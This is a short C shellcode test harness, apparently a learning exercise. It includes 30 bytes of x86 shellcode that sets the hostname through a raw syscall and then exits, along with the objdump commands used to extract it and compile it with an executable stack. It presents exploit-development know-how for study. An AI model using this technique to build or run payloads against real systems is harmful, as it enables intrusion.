#include <stdio.h>
#include <string.h>

/*
Get shellcode from disassembly dump:
$ echo `objdump -d sethostn  | grep -v file | grep '[0-9a-f]:' | cut  -f 2 ` | sed 's/ /\\x/g' | sed 's/^/\\x/g'
\x68\x7c\x58\x20\x20\x68\x4d\x34\x74\x72\x89\xe3\x31\xc9\xb1\x06\x6a\x4a\x58\xcd\x80\x6a\x01\x58\x31\xdb\xb3\x07\xcd\x80

Check for NULL bytes in shellcode:
$ objdump -d sethostn | grep 00

Check instructions:
$ objdump -d -M intel sethostn 

sethostn:     file format elf32-i386

Disassembly of section .text:

08048080 <_start>:
 8048080:	68 7c 58 20 20       	push   0x2020587c
 8048085:	68 4d 34 74 72       	push   0x7274344d
 804808a:	89 e3                	mov    ebx,esp
 804808c:	31 c9                	xor    ecx,ecx
 804808e:	b1 06                	mov    cl,0x6
 8048090:	6a 4a                	push   0x4a
 8048092:	58                   	pop    eax
 8048093:	cd 80                	int    0x80
 8048095:	6a 01                	push   0x1
 8048097:	58                   	pop    eax
 8048098:	31 db                	xor    ebx,ebx
 804809a:	b3 07                	mov    bl,0x7
 804809c:	cd 80                	int    0x80

Add to shellcode skeleton and compile:
$ gcc -o shellcode -z execstack shellcode.c

Test shellcode:
$ sudo ./shellcode 
Shellcode Length:  30

*/

unsigned char code[] = \
    "\x68\x7c\x58\x20\x20\x68\x4d\x34\x74\x72\x89\xe3\x31\xc9\xb1\x06\x6a\x4a\x58\xcd\x80\x6a\x01\x58\x31\xdb\xb3\x07\xcd\x80";

// Function pointer
typedef int (*func_ptr)();

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	func_ptr ret = (func_ptr) code;

	ret();
}
